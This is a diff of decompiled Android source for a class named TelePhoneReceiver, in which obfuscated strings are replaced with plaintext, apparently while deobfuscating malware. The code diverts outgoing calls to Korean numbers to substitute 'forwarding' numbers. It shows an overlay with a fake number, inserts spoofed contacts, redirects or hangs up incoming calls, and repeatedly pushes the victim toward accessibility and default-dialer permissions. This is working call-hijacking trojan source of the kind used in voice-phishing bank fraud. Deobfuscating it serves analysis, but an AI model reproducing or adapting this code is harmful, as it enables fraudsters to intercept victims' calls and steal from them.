@@ -72,6 +72,10 @@ public class TelePhoneReceiver extends BroadcastReceiver {
         lastRequestDialerTime = 0L;
     }
 
+    public TelePhoneReceiver() {
+        System.out.println("demo........");
+    }
+
     public static String access$000(TelePhoneReceiver this$0) {
         return this$0.savedNumberReal;
     }
@@ -103,32 +107,43 @@ public class TelePhoneReceiver extends BroadcastReceiver {
         this.mPhoneCallListener = phoneCallListener;
     }
     @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, android.content.Intent intent) {
+    public void onReceive(Context context, Intent intent) {
         final StringBuilder sb = new StringBuilder();
-        sb.append(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBs"));
-        if (!bb7d7pu7.m5998("Bg8P").equals(TelePhoneReceiver.SWITCH_STATUS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ"), bb7d7pu7.m5998("Bgc")))) {
+//-^-         sb.append(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBs"));
+        sb.append("PhoneCallReceiver");
+//-^-         if (!bb7d7pu7.m5998("Bg8P").equals(TelePhoneReceiver.SWITCH_STATUS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ"), bb7d7pu7.m5998("Bgc")))) {
+        if (!"off".equals(TelePhoneReceiver.SWITCH_STATUS = SharedPreferencesUtils.getValue("system_switch", "on"))) {
             final StringBuilder sb2 = new StringBuilder();
-            sb2.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSQgKHQAGB1NJ"));
+//-^-             sb2.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSQgKHQAGB1NJ"));
+            sb2.append(", onReceive, action: ");
             sb2.append(intent.getAction());
             sb.append(sb2.toString());
-            if (intent.getAction().equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyolJjosNjowOj0sJDYtICglJi46"))) {
-                if (!SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8gOzo9"), true) && System.currentTimeMillis() - TelePhoneReceiver.lastRequestDialerTime > 60000L) {
+//-^-             if (intent.getAction().equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyolJjosNjowOj0sJDYtICglJi46"))) {
+            if (intent.getAction().equals("android.intent.action.CLOSE_SYSTEM_DIALOGS")) {
+//-^-                 if (!SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8gOzo9"), true) && System.currentTimeMillis() - TelePhoneReceiver.lastRequestDialerTime > 60000L) {
+                if (!SharedPreferencesUtils.getValue("KEY_FIRST", true) && System.currentTimeMillis() - TelePhoneReceiver.lastRequestDialerTime > 60000L) {
                     TelePhoneReceiver.lastRequestDialerTime = System.currentTimeMillis();
                     if (!SettingUtils.isEnabledAccessibility(context)) {
-                        final Intent intent2 = new Intent(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcoKiosOjogKyAlID0wNjosPT0gJy46"));
+//-^-                         final Intent intent2 = new Intent(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcoKiosOjogKyAlID0wNjosPT0gJy46"));
+                        final Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                         intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         context.startActivity(intent2);
                     } else {
-                        SettingUtils.requestDefaultDialer(context, true, bb7d7pu7.m5998("PQwFDDkBBgcMOwwKDAAfDBs"));
+//-^-                         SettingUtils.requestDefaultDialer(context, true, bb7d7pu7.m5998("PQwFDDkBBgcMOwwKDAAfDBs"));
+                        SettingUtils.requestDefaultDialer(context, true, "TelePhoneReceiver");
                     }
                 }
-                final String stringExtra = intent.getStringExtra(bb7d7pu7.m5998("GwwIGgYH"));
+//-^-                 final String stringExtra = intent.getStringExtra(bb7d7pu7.m5998("GwwIGgYH"));
+                final String stringExtra = intent.getStringExtra("reason");
                 final StringBuilder sb3 = new StringBuilder();
-                sb3.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSRsMCBoGB1NJ"));
+//-^-                 sb3.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSRsMCBoGB1NJ"));
+                sb3.append(", onReceive, reason: ");
                 sb3.append(stringExtra);
-                sb3.append(bb7d7pu7.m5998("RUkaAQYeU0k"));
+//-^-                 sb3.append(bb7d7pu7.m5998("RUkaAQYeU0k"));
+                sb3.append(", show: ");
                 sb3.append(OverlayService.isShow);
-                sb3.append(bb7d7pu7.m5998("RUkAGj0GIQYEDCsQKgYNDFNJ"));
+//-^-                 sb3.append(bb7d7pu7.m5998("RUkAGj0GIQYEDCsQKgYNDFNJ"));
+                sb3.append(", isToHomeByCode: ");
                 sb3.append(this.isToHomeByCode);
                 sb.append(sb3.toString());
                 if (stringExtra != null && !TextUtils.isEmpty((CharSequence) stringExtra) && !OverlayService.isShow) {
@@ -143,29 +158,39 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                 LogUtils.callLog(sb.toString());
             }
             if (TelePhoneReceiver.telephonyManager == null) {
-                TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
+//-^-                 TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
+                TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService("phone");
             }
             final Bundle extras = intent.getExtras();
             if (extras != null && this.mPhoneCallListener != null && TelePhoneReceiver.mContext != null) {
                 final boolean checkFloatPermission = SettingUtils.checkFloatPermission(context);
-                final String string = extras.getString(bb7d7pu7.m5998("Gh0IHQw"));
-                final boolean equals = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRycsPjYmPD0uJiAnLjYqKCUl").equals(intent.getAction());
-                final String m5998 = bb7d7pu7.m5998("RUkKCAUFJQYONlNJ");
-                final String m59982 = bb7d7pu7.m5998("DwYbHggbDQAHDg");
-                final String m59983 = bb7d7pu7.m5998("BwYbBAgF");
+//-^-                 final String string = extras.getString(bb7d7pu7.m5998("Gh0IHQw"));
+                final String string = extras.getString("state");
+//-^-                 final boolean equals = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRycsPjYmPD0uJiAnLjYqKCUl").equals(intent.getAction());
+                final boolean equals = "android.intent.action.NEW_OUTGOING_CALL".equals(intent.getAction());
+//-^-                 final String m5998 = bb7d7pu7.m5998("RUkKCAUFJQYONlNJ");
+                final String m5998 = ", callLog_: ";
+//-^-                 final String m59982 = bb7d7pu7.m5998("DwYbHggbDQAHDg");
+                final String m59982 = "forwarding";
+//-^-                 final String m59983 = bb7d7pu7.m5998("BwYbBAgF");
+                final String m59983 = "normal";
                 if (equals) {
                     final boolean defaultDialer = SettingUtils.isDefaultDialer(context);
                     TelePhoneReceiver.callStartTime = new Date();
-                    final String string2 = extras.getString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
+//-^-                     final String string2 = extras.getString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
+                    final String string2 = extras.getString("android.intent.extra.PHONE_NUMBER");
                     this.savedNumberReal = string2;
-                    if ((this.savedNumber = string2) != null && string2.startsWith(bb7d7pu7.m5998("QlFb"))) {
+//-^-                     if ((this.savedNumber = string2) != null && string2.startsWith(bb7d7pu7.m5998("QlFb"))) {
+                    if ((this.savedNumber = string2) != null && string2.startsWith("+82")) {
                         final StringBuilder sb4 = new StringBuilder();
-                        sb4.append(bb7d7pu7.m5998("WQ"));
+//-^-                         sb4.append(bb7d7pu7.m5998("WQ"));
+                        sb4.append("0");
                         sb4.append(this.savedNumber.substring(3));
                         this.savedNumber = sb4.toString();
                     }
                     final StringBuilder sb5 = new StringBuilder();
-                    sb5.append(bb7d7pu7.m5998("RUmP4sGP4PqM5t6OyehTSQ"));
+//-^-                     sb5.append(bb7d7pu7.m5998("RUmP4sGP4PqM5t6OyehTSQ"));
+                    sb5.append(", 拨打号码: ");
                     sb5.append(this.savedNumber);
                     sb.append(sb5.toString());
                     final LimitPhoneNumberBean forwarding = SettingUtils.isForwarding(this.savedNumber);
@@ -182,15 +207,20 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             }
                             final boolean b = true;
                             final StringBuilder sb6 = new StringBuilder();
-                            sb6.append(bb7d7pu7.m5998("RUmP8caM-c-O4NCPx-NTSQ"));
+//-^-                             sb6.append(bb7d7pu7.m5998("RUmP8caM-c-O4NCPx-NTSQ"));
+                            sb6.append(", 是否特殊: ");
                             sb6.append(b);
-                            sb6.append(bb7d7pu7.m5998("RUmA0vGBx82O_dyBxvRTSQ"));
+//-^-                             sb6.append(bb7d7pu7.m5998("RUmA0vGBx82O_dyBxvRTSQ"));
+                            sb6.append(", 默认电话: ");
                             sb6.append(defaultDialer);
-                            sb6.append(bb7d7pu7.m5998("RUmA6MeO1MBTSQ"));
+//-^-                             sb6.append(bb7d7pu7.m5998("RUmA6MeO1MBTSQ"));
+                            sb6.append(", 遮罩: ");
                             sb6.append(checkFloatPermission);
                             sb.append(sb6.toString());
-                            if (!b && !TextUtils.isEmpty((CharSequence) this.savedNumberReal) && !bb7d7pu7.m5998("WFhb").equals(this.savedNumber)) {
-                                sb.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKG1eGN0eSM5eyM-cKO4NCPx-OM5t6OyeiG1eA"));
+//-^-                             if (!b && !TextUtils.isEmpty((CharSequence) this.savedNumberReal) && !bb7d7pu7.m5998("WFhb").equals(this.savedNumber)) {
+                            if (!b && !TextUtils.isEmpty((CharSequence) this.savedNumberReal) && !"112".equals(this.savedNumber)) {
+//-^-                                 sb.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKG1eGN0eSM5eyM-cKO4NCPx-OM5t6OyeiG1eA"));
+                                sb.append(", 呼叫转移（不包含特殊号码）");
                                 if (!defaultDialer && checkFloatPermission) {
                                     OverlayService.actionStart(context, this.savedNumber, 2);
                                     ContentUtils.insertContacts(context, this.savedNumber, this.savedNumberReal);
@@ -200,7 +230,8 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             }
                             String s = this.savedNumber;
                             final StringBuilder sb7 = new StringBuilder();
-                            sb7.append(bb7d7pu7.m5998("RUkAGjscBwcABw5TSQ"));
+//-^-                             sb7.append(bb7d7pu7.m5998("RUkAGjscBwcABw5TSQ"));
+                            sb7.append(", isRunning: ");
                             sb7.append(PhoneCallService.isRunning);
                             sb.append(sb7.toString());
                             while (true) {
@@ -208,25 +239,31 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                     if (!b || TextUtils.isEmpty((CharSequence) this.savedNumberReal)) {
                                         break;
                                     }
-                                    sb.append(bb7d7pu7.m5998("RUmO4NCPx-OM5t6OyehFSYHX7IzjwIzj9oHq1A"));
+//-^-                                     sb.append(bb7d7pu7.m5998("RUmO4NCPx-OM5t6OyehFSYHX7IzjwIzj9oHq1A"));
+                                    sb.append(", 特殊号码, 辅助功能");
                                     final String savedNumberReal = this.savedNumberReal;
                                     this.savedNumber = savedNumberReal;
-                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
+//-^-                                     TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
+                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, "forwarding", System.currentTimeMillis());
                                     AppStartV.setAutoService(true, s, this.savedNumberReal);
                                     final StringBuilder sb8 = new StringBuilder();
-                                    sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDCoIBQUnHAQLDBtTSQ"));
+//-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDCoIBQUnHAQLDBtTSQ"));
+                                    sb8.append(", autoServiceCallNumber: ");
                                     sb8.append(s);
-                                    sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDC8GGx4IGw0ABw4nHAQLDBtTSQ"));
+//-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDC8GGx4IGw0ABw4nHAQLDBtTSQ"));
+                                    sb8.append(", autoServiceForwardingNumber: ");
                                     sb8.append(this.savedNumberReal);
                                     sb.append(sb8.toString());
                                 } else {
                                     if (b && !defaultDialer && checkFloatPermission) {
-                                        sb.append(bb7d7pu7.m5998("RUmA6MeO1MA"));
+//-^-                                         sb.append(bb7d7pu7.m5998("RUmA6MeO1MA"));
+                                        sb.append(", 遮罩");
                                         OverlayService.actionStart(context, s, 2);
                                         break;
                                     }
                                     final StringBuilder sb9 = new StringBuilder();
-                                    sb9.append(bb7d7pu7.m5998("RUkaBhwbCgxTSQ"));
+//-^-                                     sb9.append(bb7d7pu7.m5998("RUkaBhwbCgxTSQ"));
+                                    sb9.append(", source: ");
                                     sb9.append(PhoneActivity.mSource);
                                     sb.append(sb9.toString());
                                     if (!TextUtils.isEmpty((CharSequence) AppStartV.autoServiceCallNumberMark)) {
@@ -234,7 +271,8 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                         s = AppStartV.autoServiceCallNumberMark;
                                         TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.autoServiceCallNumberMark, this.savedNumber, "forwarding", System.currentTimeMillis());
                                         final StringBuilder sb10 = new StringBuilder();
-                                        sb10.append(bb7d7pu7.m5998("RUmB1-yM48CM4_aB6tSP5euP_8SM-edFSQQqCAUFJQYOKwwIB1NJ"));
+//-^-                                         sb10.append(bb7d7pu7.m5998("RUmB1-yM48CM4_aB6tSP5euP_8SM-edFSQQqCAUFJQYOKwwIB1NJ"));
+                                        sb10.append(", 辅助功能挂断后, mCallLogBean: ");
                                         sb10.append(TelePhoneReceiver.mCallLogBean);
                                         sb.append(sb10.toString());
                                         final int n = 1;
@@ -247,34 +285,42 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                     s = AppStartV.customDialerCallNumber;
                                     TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.customDialerCallNumber, this.savedNumber, "forwarding", System.currentTimeMillis());
                                     final StringBuilder sb11 = new StringBuilder();
-                                    sb11.append(bb7d7pu7.m5998("RUmB7sOMx_ON0OCP4sGM5t5FSQQqCAUFJQYOKwwIB1NJ"));
+//-^-                                     sb11.append(bb7d7pu7.m5998("RUmB7sOMx_ON0OCP4sGM5t5FSQQqCAUFJQYOKwwIB1NJ"));
+                                    sb11.append(", 自定义拨号, mCallLogBean: ");
                                     sb11.append(TelePhoneReceiver.mCallLogBean);
                                     sb.append(sb11.toString());
                                 }
                                 final int n = 1;
                                 final String s2 = s;
                                 final StringBuilder sb12 = new StringBuilder();
-                                sb12.append(bb7d7pu7.m5998("RUmPxMqM0dGM-NWM7tNTSQ"));
+//-^-                                 sb12.append(bb7d7pu7.m5998("RUmPxMqM0dGM-NWM7tNTSQ"));
+                                sb12.append(", 正常呼出: ");
                                 sb12.append(s2);
                                 sb.append(sb12.toString());
                                 if (n != 0) {
                                     final StringBuilder sb13 = new StringBuilder();
-                                    sb13.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ"));
+//-^-                                     sb13.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ"));
+                                    sb13.append(", 呼叫转移: ");
                                     sb13.append(this.savedNumber);
                                     sb.append(sb13.toString());
                                 }
-                                final String m59984 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
+//-^-                                 final String m59984 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
+                                final String m59984 = "KEY_IS_FORWARDING_HAND_UP";
                                 boolean b2 = n != 0;
                                 String s3 = s2;
                                 if (SharedPreferencesUtils.getValue(m59984, false)) {
                                     SharedPreferencesUtils.putValue(m59984, false);
-                                    final String m59985 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
+//-^-                                     final String m59985 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
+                                    final String m59985 = "KEY_FORWARDING_SHOW_PHONE";
                                     final String value = SharedPreferencesUtils.getValue(m59985, "");
-                                    final String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
+//-^-                                     final String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
+                                    final String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
                                     final StringBuilder sb14 = new StringBuilder();
-                                    sb14.append(bb7d7pu7.m5998("RUmP8deOzdOM5t6OyehTSQ"));
+//-^-                                     sb14.append(bb7d7pu7.m5998("RUmP8deOzdOM5t6OyehTSQ"));
+                                    sb14.append(", 显示号码: ");
                                     sb14.append(value);
-                                    sb14.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKM5t6OyehTSQ"));
+//-^-                                     sb14.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKM5t6OyehTSQ"));
+                                    sb14.append(", 呼叫转移号码: ");
                                     sb14.append(value2);
                                     sb.append(sb14.toString());
                                     b2 = (n != 0);
@@ -291,9 +337,11 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                     }
                                 }
                                 final StringBuilder sb15 = new StringBuilder();
-                                sb15.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw5TSQ"));
+//-^-                                 sb15.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw5TSQ"));
+                                sb15.append(", isForwarding: ");
                                 sb15.append(b2);
-                                sb15.append(bb7d7pu7.m5998("RUkZAQYHDDoBBh5TSQ"));
+//-^-                                 sb15.append(bb7d7pu7.m5998("RUkZAQYHDDoBBh5TSQ"));
+                                sb15.append(", phoneShow: ");
                                 sb15.append(s3);
                                 sb15.append(m5998);
                                 final CallLogBean mCallLogBean = TelePhoneReceiver.mCallLogBean;
@@ -301,7 +349,8 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                 if (mCallLogBean != null) {
                                     s4 = mCallLogBean.toString();
                                 } else {
-                                    s4 = bb7d7pu7.m5998("JzwlJQ");
+//-^-                                     s4 = bb7d7pu7.m5998("JzwlJQ");
+                                    s4 = "NULL";
                                 }
                                 sb15.append(s4);
                                 sb.append(sb15.toString());
@@ -316,11 +365,14 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                         }
                     }
                 }
-                final String string3 = extras.getString(bb7d7pu7.m5998("AAcKBgQABw42BxwECwwb"));
+//-^-                 final String string3 = extras.getString(bb7d7pu7.m5998("AAcKBgQABw42BxwECwwb"));
+                final String string3 = extras.getString("incoming_number");
                 final StringBuilder sb16 = new StringBuilder();
-                sb16.append(bb7d7pu7.m5998("RUmO_dyBxvSM-NWM7MxFSRodCB0MOh0bU0k"));
+//-^-                 sb16.append(bb7d7pu7.m5998("RUmO_dyBxvSM-NWM7MxFSRodCB0MOh0bU0k"));
+                sb16.append(", 电话呼入, stateStr: ");
                 sb16.append(string);
-                sb16.append(bb7d7pu7.m5998("RUkHHAQLDBtTSQ"));
+//-^-                 sb16.append(bb7d7pu7.m5998("RUkHHAQLDBtTSQ"));
+                sb16.append(", number: ");
                 sb16.append(string3);
                 sb.append(sb16.toString());
                 if (TelephonyManager.EXTRA_STATE_RINGING.equals(string) && TextUtils.isEmpty((CharSequence) string3)) {
@@ -339,15 +391,18 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                         TelePhoneReceiver.callStartTime = new Date();
                         final String forced = SettingUtils.isForced(string3);
                         final boolean empty = TextUtils.isEmpty((CharSequence) forced);
-                        final String m59986 = bb7d7pu7.m5998("DwYbCgwN");
-                        final String m59987 = bb7d7pu7.m5998("RUkAGjoBBh5TSQ");
+//-^-                         final String m59986 = bb7d7pu7.m5998("DwYbCgwN");
+                        final String m59986 = "forced";
+//-^-                         final String m59987 = bb7d7pu7.m5998("RUkAGjoBBh5TSQ");
+                        final String m59987 = ", isShow: ";
                         if (!empty) {
                             if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                                 SettingUtils.toHome(context);
                                 this.isToHomeByCode = true;
                             }
                             this.savedNumberReal = forced;
-                            SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA"), string3);
+//-^-                             SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA"), string3);
+                            SharedPreferencesUtils.putValue("KEY_FORCED_PHONE", string3);
                             TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, this.savedNumberReal, "forced", System.currentTimeMillis());
                             boolean actionStart;
                             if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
@@ -372,16 +427,19 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             }
                             TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, string3, "blacklist", System.currentTimeMillis());
                             final StringBuilder sb18 = new StringBuilder();
-                            sb18.append(bb7d7pu7.m5998("RUmA0viM-eSM5PxFSQoIBQUlBg42U0k"));
+//-^-                             sb18.append(bb7d7pu7.m5998("RUmA0viM-eSM5PxFSQoIBQUlBg42U0k"));
+                            sb18.append(", 黑名单, callLog_: ");
                             sb18.append(TelePhoneReceiver.mCallLogBean.toString());
                             sb.append(sb18.toString());
-                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, bb7d7pu7.m5998("CwUICgIFABod"), TelePhoneReceiver.callStartTime);
+//-^-                             this.mPhoneCallListener.onIncomingCallReceived(string3, string3, bb7d7pu7.m5998("CwUICgIFABod"), TelePhoneReceiver.callStartTime);
+                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, "blacklist", TelePhoneReceiver.callStartTime);
                             LogUtils.callLog(sb.toString());
                             if (SettingUtils.endCall(context)) {
                                 this.isBlack = true;
                             }
                         } else {
-                            sb.append(bb7d7pu7.m5998("RUmPxMqM0dGP9MyO_dw"));
+//-^-                             sb.append(bb7d7pu7.m5998("RUmPxMqM0dGP9MyO_dw"));
+                            sb.append(", 正常来电");
                             final boolean b3 = !SettingUtils.isDefaultDialer(AppStartV.getContext()) && checkFloatPermission && OverlayService.actionStart(context, string3, 1);
                             final StringBuilder sb19 = new StringBuilder();
                             sb19.append(m59987);
@@ -524,7 +582,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
             @Override // java.lang.Runnable
             public void run() {
                 CallLogHelper.execute();
-                if (Constants.mCallLogList.size() > 0) {
+                if (Constants.mCallLogList != null && Constants.mCallLogList.size() > 0) {
                     TelePhoneReceiver.this.mHandler.postDelayed(new Runnable() { // from class: com.wish.lmbank.receiver.TelePhoneReceiver.3.1
                         @Override // java.lang.Runnable
                         public void run() {
